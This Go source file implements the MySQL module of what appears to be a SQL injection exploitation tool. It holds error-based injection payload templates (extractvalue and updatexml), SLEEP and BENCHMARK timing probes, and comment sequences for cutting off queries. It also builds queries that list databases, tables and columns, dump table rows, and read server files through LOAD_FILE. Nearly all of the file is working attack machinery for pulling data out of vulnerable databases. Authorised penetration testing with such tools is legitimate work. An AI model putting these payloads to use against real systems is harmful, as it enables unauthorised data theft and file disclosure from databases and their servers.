package dbms

import (
	"fmt"
	"strings"
)

// MySQL implements the DBMS interface for MySQL databases.
type MySQL struct{}

// Name returns the canonical DBMS name.
func (m *MySQL) Name() string {
	return "MySQL"
}

// --- String operations ---

// Concatenate returns a MySQL CONCAT(...) expression.
func (m *MySQL) Concatenate(parts ...string) string {
	return fmt.Sprintf("CONCAT(%s)", strings.Join(parts, ","))
}

// Substring returns a MySQL SUBSTRING(expr, start, length) expression.
func (m *MySQL) Substring(expr string, start, length int) string {
	return fmt.Sprintf("SUBSTRING(%s,%d,%d)", expr, start, length)
}

// Length returns a MySQL LENGTH(expr) expression.
func (m *MySQL) Length(expr string) string {
	return fmt.Sprintf("LENGTH(%s)", expr)
}

// ASCII returns a MySQL ASCII(expr) expression.
func (m *MySQL) ASCII(expr string) string {
	return fmt.Sprintf("ASCII(%s)", expr)
}

// Char returns a MySQL CHAR(code) expression.
func (m *MySQL) Char(code int) string {
	return fmt.Sprintf("CHAR(%d)", code)
}

// --- Version and identity ---

// VersionQuery returns the MySQL expression to retrieve the server version.
func (m *MySQL) VersionQuery() string {
	return "@@version"
}

// CurrentUserQuery returns the MySQL expression to retrieve the current user.
func (m *MySQL) CurrentUserQuery() string {
	return "CURRENT_USER()"
}

// CurrentDBQuery returns the MySQL expression to retrieve the current database.
func (m *MySQL) CurrentDBQuery() string {
	return "DATABASE()"
}

// HostnameQuery returns the MySQL expression to retrieve the server hostname.
func (m *MySQL) HostnameQuery() string {
	return "@@hostname"
}

// --- Enumeration queries ---

// ListDatabasesQuery returns a SQL query to list all databases.
func (m *MySQL) ListDatabasesQuery() string {
	return "SELECT schema_name FROM information_schema.schemata"
}

// ListTablesQuery returns a SQL query to list all tables in the given database.
func (m *MySQL) ListTablesQuery(database string) string {
	return fmt.Sprintf("SELECT table_name FROM information_schema.tables WHERE table_schema='%s'", database)
}

// ListColumnsQuery returns a SQL query to list all columns in the given table.
func (m *MySQL) ListColumnsQuery(database, table string) string {
	return fmt.Sprintf("SELECT column_name FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s'", database, table)
}

// CountRowsQuery returns a SQL query to count rows in the given table.
func (m *MySQL) CountRowsQuery(database, table string) string {
	return fmt.Sprintf("SELECT COUNT(*) FROM %s.%s", database, table)
}

// DumpQuery returns a SQL query to dump rows from the given table.
func (m *MySQL) DumpQuery(database, table string, columns []string, offset, limit int) string {
	return fmt.Sprintf("SELECT %s FROM %s.%s LIMIT %d OFFSET %d",
		strings.Join(columns, ","), database, table, limit, offset)
}

// --- Error-based payloads ---

// ErrorPayloads returns MySQL-specific error-based injection payload templates.
func (m *MySQL) ErrorPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Name:     "extractvalue",
			Template: "extractvalue(1,concat(0x7e,({{.Query}})))",
			Columns:  1,
			DBMS:     "MySQL",
		},
		{
			Name:     "updatexml",
			Template: "updatexml(1,concat(0x7e,({{.Query}})),1)",
			Columns:  1,
			DBMS:     "MySQL",
		},
	}
}

// --- Time-based ---

// SleepFunction returns a MySQL SLEEP(n) expression.
func (m *MySQL) SleepFunction(seconds int) string {
	return fmt.Sprintf("SLEEP(%d)", seconds)
}

// HeavyQuery returns a MySQL CPU-intensive query for time-based detection.
func (m *MySQL) HeavyQuery() string {
	return "SELECT BENCHMARK(5000000,SHA1('test'))"
}

// --- Boolean constructs ---

// IfThenElse returns a MySQL IF(condition, trueExpr, falseExpr) expression.
func (m *MySQL) IfThenElse(condition, trueExpr, falseExpr string) string {
	return fmt.Sprintf("IF(%s,%s,%s)", condition, trueExpr, falseExpr)
}

// --- Quoting and comments ---

// QuoteString wraps the string in single quotes, escaping embedded single quotes.
func (m *MySQL) QuoteString(s string) string {
	escaped := strings.ReplaceAll(s, "'", "''")
	return fmt.Sprintf("'%s'", escaped)
}

// CommentSequence returns the MySQL line comment sequence.
func (m *MySQL) CommentSequence() string {
	return "-- "
}

// InlineComment returns the MySQL inline comment syntax.
func (m *MySQL) InlineComment() string {
	return "/**/"
}

// --- File operations ---

// FileReadQuery returns a MySQL expression to read a file from the server.
func (m *MySQL) FileReadQuery(path string) string {
	return fmt.Sprintf("LOAD_FILE('%s')", path)
}

// --- Capabilities ---

// Capabilities returns the feature set supported by MySQL.
func (m *MySQL) Capabilities() Capabilities {
	return Capabilities{
		StackedQueries: true,
		ErrorBased:     true,
		UnionBased:     true,
		FileRead:       true,
		FileWrite:      true,
		OSCommand:      false,
		OutOfBand:      false,
		Subqueries:     true,
		CaseWhen:       true,
		LimitOffset:    true,
	}
}
